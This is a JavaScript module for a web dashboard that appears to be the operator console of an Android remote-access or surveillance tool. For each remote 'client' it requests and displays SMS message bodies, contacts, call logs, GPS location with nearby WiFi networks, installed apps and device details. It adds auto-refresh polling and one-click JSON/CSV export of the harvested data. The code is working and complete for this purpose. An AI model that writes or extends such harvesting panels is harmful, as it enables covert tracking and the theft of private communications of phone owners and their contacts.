import { checkFeatureAccess } from "./feature-gate.js";

const clientId = new URLSearchParams(window.location.search).get("clientId") || "";
const clientLabel = document.getElementById("client-label");
const statusDot = document.getElementById("status-dot");
const statusText = document.getElementById("status-text");
const statsBar = document.getElementById("stats-bar");
const errorBanner = document.getElementById("error-banner");
const errorText = document.getElementById("error-text");
const container = document.getElementById("sections-container");

if (clientLabel) {
  clientLabel.innerHTML = `Client: <span class="text-slate-300 font-mono">${escapeHtml(clientId)}</span>`;
}

// ── State ─────────────────────────────────────────────────────────────────────

const state = {
  device:   { data: null, loading: false, collapsed: false },
  sms:      { data: null, loading: false, collapsed: false, search: "", sort: null, sortDir: "", page: 0, pageSize: 50 },
  contacts: { data: null, loading: false, collapsed: false, search: "", sort: null, sortDir: "", page: 0, pageSize: 50 },
  calllog:  { data: null, loading: false, collapsed: false, search: "", sort: null, sortDir: "", page: 0, pageSize: 50 },
  location: { data: null, loading: false, collapsed: false },
  apps:     { data: null, loading: false, collapsed: false, search: "", sort: null, sortDir: "", page: 0, pageSize: 100 },
};
const lastUpdated = {};
const freshnessTimers = {};
let autoRefreshTimers = {};

// SECTIONS that support search/pagination/sort/export
const TABLE_SECTIONS = ["sms", "contacts", "calllog", "apps"];
const ALL_SECTIONS = ["device", "sms", "contacts", "calllog", "location", "apps"];

// ── Column definitions for sortable tables ────────────────────────────────────

const TABLE_COLUMNS = {
  sms: [
    { key: "folder",    label: "Folder",  sortable: true, width: "w-14" },
    { key: "address",   label: "Address", sortable: true, width: "w-28" },
    { key: "body",      label: "Body",    sortable: false, width: "" },
    { key: "date",      label: "Date",    sortable: true, width: "w-32 text-right" },
    { key: "read",      label: "",        sortable: false, width: "w-10" },
  ],
  contacts: [
    { key: "name",      label: "Name",    sortable: true, width: "w-36" },
    { key: "number",    label: "Number",  sortable: true, width: "w-32" },
    { key: "type",      label: "Type",    sortable: true, width: "w-20" },
    { key: "timesContacted", label: "#",  sortable: true, width: "w-12 text-right" },
    { key: "starred",   label: "",        sortable: false, width: "w-10" },
  ],
  calllog: [
    { key: "number",    label: "Number",  sortable: true, width: "w-28" },
    { key: "type",      label: "Type",    sortable: true, width: "w-20" },
    { key: "duration",  label: "Dur.",    sortable: true, width: "w-16 text-right" },
    { key: "date",      label: "Date",    sortable: true, width: "w-32 text-right" },
    { key: "name",      label: "Name",    sortable: true, width: "w-28" },
  ],
  apps: [
    { key: "packageName", label: "Package", sortable: true, width: "w-40" },
    { key: "versionName", label: "Version", sortable: true, width: "w-20" },
    { key: "systemApp",   label: "Type",    sortable: true, width: "w-14" },
    { key: "enabled",     label: "",        sortable: false, width: "w-10" },
  ],
};

// ── Helpers ───────────────────────────────────────────────────────────────────

function escapeHtml(text) {
  if (text == null) return "";
  const el = document.createElement("span");
  el.textContent = String(text);
  return el.innerHTML;
}

function setStatus(online) {
  if (!statusDot || !statusText) return;
  statusDot.className = `w-2 h-2 rounded-full ${online ? "bg-emerald-500" : "bg-red-500"}`;
  statusText.textContent = online ? "Online" : "Offline";
}

function showError(msg) {
  if (!errorBanner || !errorText) return;
  errorText.textContent = msg;
  errorBanner.classList.remove("hidden");
}

function hideError() {
  if (!errorBanner) return;
  errorBanner.classList.add("hidden");
}

function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

function formatDate(ts) {
  if (!ts) return "—";
  const d = new Date(typeof ts === "number" ? ts : parseInt(ts, 10));
  if (isNaN(d.getTime())) return String(ts);
  return d.toLocaleString();
}

function formatDuration(seconds) {
  if (seconds == null) return "—";
  const m = Math.floor(seconds / 60);
  const s = seconds % 60;
  return m > 0 ? `${m}m ${s}s` : `${s}s`;
}

function formatBytes(bytes) {
  if (bytes == null || bytes === 0) return "—";
  const units = ["B", "KB", "MB", "GB", "TB"];
  let i = 0;
  let v = bytes;
  while (v >= 1024 && i < units.length - 1) { v /= 1024; i++; }
  return `${v.toFixed(1)} ${units[i]}`;
}

function relativeTime(ts) {
  if (!ts) return "";
  const secs = Math.floor((Date.now() - ts) / 1000);
  if (secs < 5) return "just now";
  if (secs < 60) return `${secs}s ago`;
  if (secs < 3600) return `${Math.floor(secs / 60)}m ago`;
  return `${Math.floor(secs / 3600)}h ago`;
}

// ── Data fetch layer ──────────────────────────────────────────────────────────

async function fetchAndroidData(dataType) {
  try {
    const res = await fetch(`/api/clients/${encodeURIComponent(clientId)}/android/data?type=${dataType}`);
    if (!res.ok) return null;
    return await res.json();
  } catch {
    return null;
  }
}

async function triggerAndroidFetch(dataType) {
  try {
    const res = await fetch(`/api/clients/${encodeURIComponent(clientId)}/android/fetch`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ dataType }),
    });
    return res.ok;
  } catch {
    return false;
  }
}

async function refreshDataType(dataType) {
  hideError();
  setLoading(dataType, true);

  // Show inline spinner
  const section = state[dataType];
  if (section) section.loading = true;
  updateLoader(dataType);

  const triggered = await triggerAndroidFetch(dataType);
  if (!triggered) {
    setLoading(dataType, false);
    if (section) section.loading = false;
    updateLoader(dataType);
    showError(`Failed to request ${dataType} data — client may be offline.`);
    return;
  }

  // Poll for data arrival
  let attempts = 0;
  const maxAttempts = 20;
  while (attempts < maxAttempts) {
    await sleep(1000);
    attempts++;
    const result = await fetchAndroidData(dataType);
    if (result && result.available && result.data) {
      section.data = result.data;
      section.loading = false;
      lastUpdated[dataType] = Date.now();
      renderSection(dataType);
      updateFreshnessDot(dataType);
      updateStatsBar(result.data);
      return;
    }
  }

  section.loading = false;
  updateLoader(dataType);
}

function setLoading(dataType, on) {
  const section = container.querySelector(`[data-section="${dataType}"]`);
  if (!section) return;
  const loader = section.querySelector(".inline-loader");
  if (loader) loader.classList.toggle("hidden", !on);
  if (on) {
    const content = section.querySelector("[id$='-content']");
    if (content) content.innerHTML = "";
  }
}

function updateLoader(dataType) {
  const section = container.querySelector(`[data-section="${dataType}"]`);
  if (!section) return;
  const loader = section.querySelector(".inline-loader");
  if (loader) loader.classList.toggle("hidden", !state[dataType]?.loading);
}

// ── Stats Bar ─────────────────────────────────────────────────────────────────

function updateStatsBar(data) {
  if (!data) return;
  statsBar.classList.remove("hidden");
  const set = (id, val) => {
    const el = document.getElementById(id);
    if (el) el.querySelector("span").textContent = val;
  };
  if (data.model)       set("stat-model", data.model);
  if (data.androidVer)  set("stat-android", `Android ${data.androidVer}`);
  if (data.batteryLevel != null) {
    const icon = data.batteryLevel <= 15 ? "fa-battery-quarter text-red-400" :
                 data.batteryLevel <= 50 ? "fa-battery-half text-yellow-400" : "fa-battery-full text-green-400";
    document.querySelector("#stat-battery i").className = `fa-solid ${icon}`;
    set("stat-battery", `${data.batteryLevel}%${data.batteryStatus ? " " + data.batteryStatus : ""}`);
  }
  if (data.totalStorage > 0) {
    const free = data.freeStorage || 0;
    const pct = Math.round(100 * free / data.totalStorage);
    set("stat-storage", `${formatBytes(free)} free / ${formatBytes(data.totalStorage)} (${pct}%)`);
  }
  if (data.uptime)      set("stat-uptime", `Up ${formatDuration(data.uptime)}`);
  if (data.wifiSSID)    set("stat-wifi", data.wifiSSID);
  if (data.lat)         set("stat-location", `${data.lat.toFixed(4)}, ${data.lon.toFixed(4)}`);
}

// ── Freshness ─────────────────────────────────────────────────────────────────

function updateFreshnessDot(dataType) {
  const section = container.querySelector(`[data-section="${dataType}"]`);
  if (!section) return;
  const dot = section.querySelector(".freshness-dot");
  const ts = section.querySelector(".freshness-ts");
  if (!dot || !ts) return;
  const updated = lastUpdated[dataType];
  if (updated) {
    dot.className = "freshness-dot w-2 h-2 rounded-full bg-emerald-500";
    dot.title = `Last updated: ${new Date(updated).toLocaleTimeString()}`;
    ts.textContent = relativeTime(updated);
  }
  // Start freshness timer
  if (freshnessTimers[dataType]) clearInterval(freshnessTimers[dataType]);
  if (lastUpdated[dataType]) {
    freshnessTimers[dataType] = setInterval(() => {
      const t = ts;
      if (t) t.textContent = relativeTime(lastUpdated[dataType]);
    }, 10000);
  }
}

// ── Filter / Sort / Paginate ──────────────────────────────────────────────────

function filterRows(items, query, fields) {
  if (!query || !query.trim()) return items;
  const q = query.toLowerCase().trim();
  return items.filter(item =>
    fields.some(f => {
      const v = item[f];
      return v != null && String(v).toLowerCase().includes(q);
    })
  );
}

function sortRows(items, key, dir) {
  if (!dir || dir === "none") return items;
  const sorted = [...items].sort((a, b) => {
    let va = a[key], vb = b[key];
    if (va == null) va = "";
    if (vb == null) vb = "";
    if (typeof va === "number" && typeof vb === "number") {
      return dir === "asc" ? va - vb : vb - va;
    }
    va = String(va).toLowerCase();
    vb = String(vb).toLowerCase();
    return dir === "asc" ? va.localeCompare(vb) : vb.localeCompare(va);
  });
  return sorted;
}

function paginate(items, page, pageSize) {
  const total = items.length;
  const pages = Math.max(1, Math.ceil(total / pageSize));
  const safePage = Math.min(page, pages - 1);
  const start = safePage * pageSize;
  const end = Math.min(start + pageSize, total);
  return { items: items.slice(start, end), page: safePage, pages, total, start, end };
}

// ── Renderers ─────────────────────────────────────────────────────────────────

function renderSection(dataType) {
  const s = state[dataType];
  if (!s) return;
  if (s.collapsed) return;
  const el = document.getElementById(`${dataType}-content`);
  if (!el) return;

  switch (dataType) {
    case "device":   el.innerHTML = renderDeviceInfo(s.data); break;
    case "sms":      el.innerHTML = renderTableView(dataType, s); break;
    case "contacts": el.innerHTML = renderTableView(dataType, s); break;
    case "calllog":  el.innerHTML = renderTableView(dataType, s); break;
    case "location": el.innerHTML = renderLocation(s.data); break;
    case "apps":     el.innerHTML = renderTableView(dataType, s); break;
  }

  updateSectionMeta(dataType);
  updateFreshnessDot(dataType);
}

function renderTableView(dataType, s) {
  const data = s.data;
  if (!data || data.error) {
    return `<p class="text-red-400">${escapeHtml(data?.error || "No data available.")}</p>`;
  }

  const items = getDataItems(dataType, data) || [];
  if (!items.length) return `<p class="text-slate-500 italic">No ${dataType} data found.</p>`;

  const cols = TABLE_COLUMNS[dataType];
  if (!cols) return `<p class="text-red-400">No columns defined for ${dataType}.</p>`;

  const searchFields = cols.map(c => c.key);
  const filtered = filterRows(items, s.search, searchFields);
  const sorted = sortRows(filtered, s.sort, s.sortDir);
  const { items: page, page: currPage, pages, total, start, end } = paginate(sorted, s.page, Number(s.pageSize));

  // Update page info display
  const section = container.querySelector(`[data-section="${dataType}"]`);
  if (section) {
    const pageInfo = section.querySelector(".page-info");
    const sectionInfo = section.querySelector(".section-info");
    if (pageInfo) pageInfo.textContent = filtered.length > 0 ? `${start + 1}-${end} of ${filtered.length}` : "0";
    if (sectionInfo) sectionInfo.textContent = filtered.length < total ? `${filtered.length} of ${total}` : `${total} total`;
    // Enable/disable pagination buttons
    section.querySelectorAll(".page-btn").forEach(btn => {
      const dir = btn.dataset.dir;
      btn.disabled = dir === "prev" ? currPage <= 0 : currPage >= pages - 1;
    });
  }

  if (!page.length) return `<p class="text-slate-500 italic">No matches.</p>`;

  const rowsHtml = page.map(item => renderRow(dataType, item, cols)).join("");

  return `<table class="w-full text-xs">
    <thead><tr class="text-slate-500 uppercase tracking-wider">${cols.map(c =>
      `<th class="text-left py-1 pr-2 ${c.width || ""}${c.sortable ? " sort-btn" : ""}" data-sort="${c.key}" data-section="${dataType}">${c.label ? escapeHtml(c.label) : ""}${c.sortable ? (s.sort === c.key ? (s.sortDir === "asc" ? ' <i class="fa-solid fa-sort-up"></i>' : ' <i class="fa-solid fa-sort-down"></i>') : ' <i class="fa-solid fa-sort text-slate-600"></i>') : ""}</th>`
    ).join("")}</tr></thead>
    <tbody>${rowsHtml}</tbody>
  </table>`;
}

function getDataItems(dataType, data) {
  switch (dataType) {
    case "sms":      return data.messages;
    case "contacts": return data.contacts;
    case "calllog":  return data.calls;
    case "apps":     return data.apps;
    default:         return [];
  }
}

function renderRow(dataType, item, cols) {
  switch (dataType) {
    case "sms":      return renderSMSRow(item, cols);
    case "contacts": return renderContactRow(item, cols);
    case "calllog":  return renderCallLogRow(item, cols);
    case "apps":     return renderAppRow(item, cols);
    default:         return "";
  }
}

function renderSMSRow(m, cols) {
  const unread = m.read === false || m.read === 0;
  return `<tr class="border-t border-slate-800${unread ? ' font-semibold text-slate-100' : ' text-slate-300'}">
    <td class="py-1.5 pr-2 text-xs"><span class="px-1.5 py-0.5 rounded bg-slate-800">${escapeHtml(m.folder || "")}</span></td>
    <td class="py-1.5 pr-2 font-mono">${escapeHtml(m.address || "")}</td>
    <td class="py-1.5 pr-2 max-w-xs truncate">${escapeHtml((m.body || "").substring(0, 150))}</td>
    <td class="py-1.5 text-right whitespace-nowrap text-slate-400">${formatDate(m.date)}</td>
    <td class="py-1.5 text-center">${m.read || m.read === undefined ? "" : '<i class="fa-solid fa-circle text-xs text-emerald-500" title="Unread"></i>'}</td>
  </tr>`;
}

function renderContactRow(c, cols) {
  return `<tr class="border-t border-slate-800 text-slate-300">
    <td class="py-1.5 pr-2 font-medium text-slate-200">${escapeHtml(c.name || "—")}</td>
    <td class="py-1.5 pr-2 font-mono">${escapeHtml(c.number || "")}</td>
    <td class="py-1.5 pr-2">${escapeHtml(c.type || "—")}</td>
    <td class="py-1.5 pr-2 text-right">${c.timesContacted != null ? c.timesContacted : "—"}</td>
    <td class="py-1.5 text-center">${c.starred ? '<i class="fa-solid fa-star text-yellow-400" title="Starred"></i>' : ""}</td>
  </tr>`;
}

function renderCallLogRow(c, cols) {
  const typeBadge = callTypeBadge(c.type);
  return `<tr class="border-t border-slate-800 text-slate-300">
    <td class="py-1.5 pr-2 font-mono">${escapeHtml(c.number || "")}</td>
    <td class="py-1.5 pr-2">${typeBadge}</td>
    <td class="py-1.5 pr-2 text-right">${formatDuration(c.duration)}</td>
    <td class="py-1.5 text-right whitespace-nowrap text-slate-400">${formatDate(c.date)}</td>
    <td class="py-1.5 text-slate-400 truncate max-w-[100px]">${escapeHtml(c.name || "")}</td>
  </tr>`;
}

function renderAppRow(a, cols) {
  return `<tr class="border-t border-slate-800 text-slate-300">
    <td class="py-1.5 pr-2 font-mono truncate max-w-[200px]" title="${escapeHtml(a.packageName)}">${escapeHtml(a.packageName)}</td>
    <td class="py-1.5 pr-2 text-slate-400">${escapeHtml(a.versionName || "")}</td>
    <td class="py-1.5 pr-2 text-xs">${a.systemApp ? '<span class="text-slate-500">System</span>' : '<span class="text-blue-400">User</span>'}</td>
    <td class="py-1.5 text-center">${a.enabled !== false ? "" : '<i class="fa-solid fa-ban text-red-400" title="Disabled"></i>'}</td>
  </tr>`;
}

function callTypeBadge(type) {
  const map = {
    "incoming": '<span class="text-emerald-400">Incoming</span>',
    "outgoing": '<span class="text-blue-400">Outgoing</span>',
    "missed": '<span class="text-red-400">Missed</span>',
    "voicemail": '<span class="text-purple-400">VM</span>',
    "rejected": '<span class="text-orange-400">Rejected</span>',
    "blocked": '<span class="text-slate-500">Blocked</span>',
  };
  return map[type] || escapeHtml(type || "—");
}

function renderDeviceInfo(data) {
  if (!data || data.error) {
    return `<p class="text-red-400">${escapeHtml(data?.error || "No data available.")}</p>`;
  }
  const rows = [
    ["Model", data.model],
    ["Manufacturer", data.manufacturer],
    ["Android Version", data.androidVer],
    ["SDK", data.sdk],
    ["Brand", data.brand],
    ["Device", data.device],
    ["Display ID", data.displayID],
    ["Security Patch", data.securityPatch],
    ["Build Time", data.buildTime],
    ["Serial", data.serial],
    ["Screen", data.screenSize ? `${data.screenSize}${data.screenDPI ? ` (${data.screenDPI} dpi)` : ""}` : null],
    ["Battery", data.batteryLevel != null ? `${data.batteryLevel}% ${data.batteryStatus || ""} ${data.batteryHealth || ""} ${data.batteryTemp ? data.batteryTemp + "°C" : ""}` : null],
    ["Storage", data.totalStorage > 0 ? `${formatBytes(data.totalStorage)} total, ${formatBytes(data.freeStorage)} free` : null],
    ["RAM", data.totalRAM > 0 ? `${formatBytes(data.totalRAM)} total, ${formatBytes(data.availableRAM)} avail` : null],
    ["CPU", data.cpuInfo || null],
    ["WiFi", data.wifiSSID ? `${data.wifiSSID}${data.wifiSpeed ? ` (${data.wifiSpeed} Mbps)` : ""}` : null],
    ["Uptime", data.uptime ? formatDuration(data.uptime) : null],
    ["Build FP", data.buildFP],
  ].filter(([, v]) => v != null && v !== "");
  return rows.map(([label, value]) =>
    `<div class="flex justify-between py-1 border-b border-slate-800 last:border-0">
      <span class="text-slate-400">${escapeHtml(label)}</span>
      <span class="text-slate-200 font-mono text-xs truncate ml-4 max-w-[250px]" title="${escapeHtml(String(value))}">${escapeHtml(String(value))}</span>
    </div>`
  ).join("");
}

function renderLocation(data) {
  if (!data || data.error) {
    return `<p class="text-red-400">${escapeHtml(data?.error || "No data available.")}</p>`;
  }
  if (!data.lat && !data.lon) {
    return `<p class="text-slate-500 italic">Location unavailable. Ensure GPS/location is enabled.</p>`;
  }
  const mapsUrl = `https://www.google.com/maps?q=${data.lat},${data.lon}`;
  const entries = [
    ["Latitude", data.lat],
    ["Longitude", data.lon],
    data.accuracy ? ["Accuracy", `${data.accuracy}m`] : null,
    data.altitude ? ["Altitude", `${data.altitude.toFixed(1)}m`] : null,
    data.bearing ? ["Bearing", `${data.bearing.toFixed(1)}°`] : null,
    data.speed ? ["Speed", `${data.speed.toFixed(1)} m/s`] : null,
    data.provider ? ["Provider", data.provider] : null,
  ].filter(Boolean);

  let apHtml = "";
  if (data.wifiAps && data.wifiAps.length > 0) {
    apHtml = `<div class="mt-3 pt-2 border-t border-slate-700">
      <p class="text-xs text-slate-500 mb-1">Nearby WiFi APs (${data.wifiAps.length}):</p>
      <div class="max-h-24 overflow-y-auto text-xs space-y-0.5">${data.wifiAps.slice(0, 20).map(ap =>
        `<div class="text-slate-400"><span class="font-mono">${escapeHtml(ap.ssid || ap.bssid || "")}</span> ${ap.frequency ? ap.frequency + "MHz" : ""} ${ap.level != null ? ap.level + "dBm" : ""}</div>`
      ).join("")}${data.wifiAps.length > 20 ? `<div class="text-slate-500">...and ${data.wifiAps.length - 20} more</div>` : ""}</div>
    </div>`;
  }

  return `<div class="space-y-1.5">
    ${entries.map(([label, value]) =>
      `<div class="flex justify-between py-1 border-b border-slate-800">
        <span class="text-slate-400">${escapeHtml(label)}</span>
        <span class="text-slate-200 font-mono">${escapeHtml(String(value))}</span>
      </div>`
    ).join("")}
    <a href="${mapsUrl}" target="_blank" rel="noopener" class="inline-flex items-center gap-1 mt-2 text-xs text-blue-400 hover:text-blue-300">
      <i class="fa-solid fa-map"></i> Open in Google Maps
    </a>
    ${apHtml}
  </div>`;
}

// ── Section metadata (badge count, etc.) ──────────────────────────────────────

function updateSectionMeta(dataType) {
  const section = container.querySelector(`[data-section="${dataType}"]`);
  if (!section) return;
  const badge = section.querySelector(".badge-count");
  if (!badge) return;
  const s = state[dataType];
  if (!s || !s.data) { badge.classList.add("hidden"); return; }
  const items = getDataItems(dataType, s.data);
  if (items && items.length > 0) {
    badge.textContent = items.length;
    badge.classList.remove("hidden");
  } else {
    badge.classList.add("hidden");
  }
}

// ── Export ────────────────────────────────────────────────────────────────────

function exportData(dataType, format) {
  const s = state[dataType];
  if (!s || !s.data) return;
  const items = getDataItems(dataType, s.data);
  if (!items || !items.length) return;

  const cols = TABLE_COLUMNS[dataType];
  const filename = `android_${dataType}_${new Date().toISOString().slice(0, 10)}`;

  if (format === "json") {
    const blob = new Blob([JSON.stringify(items, null, 2)], { type: "application/json" });
    downloadBlob(blob, `${filename}.json`);
  } else if (format === "csv") {
    const headers = cols.map(c => c.label || c.key);
    const rows = items.map(item => cols.map(c => {
      const v = item[c.key];
      if (v == null) return "";
      const s = String(v);
      return s.includes(",") || s.includes('"') ? `"${s.replace(/"/g, '""')}"` : s;
    }));
    const csv = [headers.join(","), ...rows.map(r => r.join(","))].join("\n");
    const blob = new Blob([csv], { type: "text/csv" });
    downloadBlob(blob, `${filename}.csv`);
  }
}

function downloadBlob(blob, filename) {
  const url = URL.createObjectURL(blob);
  const a = document.createElement("a");
  a.href = url;
  a.download = filename;
  a.click();
  URL.revokeObjectURL(url);
}

// ── Section collapse/expand ───────────────────────────────────────────────────

function toggleSection(dataType) {
  const s = state[dataType];
  if (!s) return;
  s.collapsed = !s.collapsed;
  const section = container.querySelector(`[data-section="${dataType}"]`);
  if (!section) return;
  const content = section.querySelector(".section-content");
  const icon = section.querySelector(".toggle-icon");
  if (content) content.classList.toggle("section-content-collapsed", s.collapsed);
  if (icon) icon.style.transform = s.collapsed ? "rotate(-90deg)" : "";
  if (!s.collapsed) renderSection(dataType);
}

// ── Auto-refresh ──────────────────────────────────────────────────────────────

function toggleAutoRefresh(dataType, enabled, interval) {
  if (autoRefreshTimers[dataType]) {
    clearInterval(autoRefreshTimers[dataType]);
    delete autoRefreshTimers[dataType];
  }
  if (enabled && interval > 0) {
    autoRefreshTimers[dataType] = setInterval(() => {
      refreshDataType(dataType);
    }, interval);
  }
}

function handleGlobalAutoRefresh(enabled, interval) {
  ALL_SECTIONS.forEach(dt => toggleAutoRefresh(dt, enabled, interval));
  const ind = document.getElementById("auto-refresh-indicator");
  if (ind) ind.classList.toggle("hidden", !enabled);
}

// ── Event delegation ──────────────────────────────────────────────────────────

container.addEventListener("click", e => {
  const target = e.target;
  const section = target.closest("[data-section]");
  const sectionType = section?.dataset?.section;

  // Fetch buttons
  const fetchBtn = target.closest(".fetch-btn");
  if (fetchBtn) {
    const dt = fetchBtn.dataset.type;
    if (dt) refreshDataType(dt);
    return;
  }

  // Section toggle (header area)
  const toggle = target.closest(".toggle-section");
  if (toggle) {
    const dt = toggle.closest("[data-section]")?.dataset?.section;
    if (dt) toggleSection(dt);
    return;
  }

  // Sort buttons
  const sortBtn = target.closest(".sort-btn");
  if (sortBtn) {
    const dt = sortBtn.dataset.section;
    const key = sortBtn.dataset.sort;
    if (dt && key) {
      const s = state[dt];
      if (!s) return;
      if (s.sort === key) {
        s.sortDir = s.sortDir === "asc" ? "desc" : s.sortDir === "desc" ? "none" : "asc";
        if (s.sortDir === "none") s.sort = null;
      } else {
        s.sort = key;
        s.sortDir = "asc";
      }
      s.page = 0; // Reset to first page on sort change
      renderSection(dt);
    }
    return;
  }

  // Pagination buttons
  const pageBtn = target.closest(".page-btn");
  if (pageBtn) {
    const dt = pageBtn.dataset.section;
    const dir = pageBtn.dataset.dir;
    if (dt && dir) {
      const s = state[dt];
      if (!s) return;
      if (dir === "prev" && s.page > 0) { s.page--; renderSection(dt); }
      else if (dir === "next") { s.page++; renderSection(dt); }
    }
    return;
  }

  // Export buttons
  const exportBtn = target.closest(".export-btn");
  if (exportBtn) {
    const dt = exportBtn.dataset.section;
    const fmt = exportBtn.dataset.format;
    if (dt && fmt) exportData(dt, fmt);
    return;
  }
});

// Search input handlers (input event, not click)
container.addEventListener("input", e => {
  const input = e.target.closest(".section-search");
  if (!input) return;
  const dt = input.dataset.section;
  if (!dt || !state[dt]) return;
  state[dt].search = input.value;
  state[dt].page = 0; // Reset to first page on search
  renderSection(dt);
});

// Page size changes
container.addEventListener("change", e => {
  const sel = e.target.closest(".page-size");
  if (!sel) return;
  const dt = sel.dataset.section;
  if (!dt || !state[dt]) return;
  state[dt].pageSize = parseInt(sel.value, 10);
  state[dt].page = 0;
  renderSection(dt);
});

// Auto-refresh interval change
document.getElementById("auto-refresh-interval")?.addEventListener("change", e => {
  const val = parseInt(e.target.value, 10);
  handleGlobalAutoRefresh(val > 0, val);
});

// Refresh All button
document.getElementById("refresh-all-btn")?.addEventListener("click", () => {
  ALL_SECTIONS.forEach(dt => refreshDataType(dt));
});

// ── Init ──────────────────────────────────────────────────────────────────────

async function loadExistingData() {
  const results = await Promise.all(
    ALL_SECTIONS.map(type => fetchAndroidData(type).then(r => ({ type, data: r })))
  );
  for (const { type, data } of results) {
    if (data && data.available && data.data) {
      state[type].data = data.data;
      lastUpdated[type] = Date.now();
      renderSection(type);
      updateStatsBar(data.data);
    }
  }
}

if (!clientId) {
  showError("No clientId specified. This page requires a ?clientId= parameter.");
} else {
  checkFeatureAccess("android", clientId).then(ok => {
    if (!ok) return;
    fetchAndroidData("device").then(result => {
      setStatus(result !== null);
    }).catch(() => setStatus(false));
    loadExistingData();
  });
}
